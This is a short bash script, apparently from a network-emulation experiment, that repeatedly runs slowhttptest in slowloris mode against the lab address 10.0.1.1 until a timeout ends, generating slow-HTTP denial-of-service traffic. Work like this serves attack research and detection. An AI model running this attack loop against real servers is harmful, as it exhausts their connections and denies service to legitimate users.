#!/bin/bash
set -e
export PATH="${PATH}:/bin"
count=$1
timeout=$2
if [[ $# -lt 2 ]]; then
    echo "usage: $0 <count> <timout>"
    exit -1
fi
# time in second
start_time=$(date +%s)
stop_time=$((start_time + timeout))
conn_duration=9
export LC_CTYPE=C
export LC_ALL=C
# host=h1 or hxx...
host=$(ip -c link show type veth | perl -ne 'print /\d+:\s+(.*)-eth0/g')
sleep_time=1
mkdir -p /tmp/exp
while [[ $((`date +%s` + conn_duration + sleep_time)) -le $stop_time ]]; do
    slowhttptest -u http://10.0.1.1 -H -c $count -r 1 -l $conn_duration -i $((conn_duration + 1))
    sleep $sleep_time
done
remain_time=$((stop_time - `date +%s`))
if [[ $remain_time -gt $conn_duration ]]; then
    remain_time=$conn_duration
fi
if [[ $remain_time -gt 0 ]]; then
    slowhttptest -u http://10.0.1.1 -H -c $count -r 1 -l $conn_duration -i $((conn_duration + 1))
fi
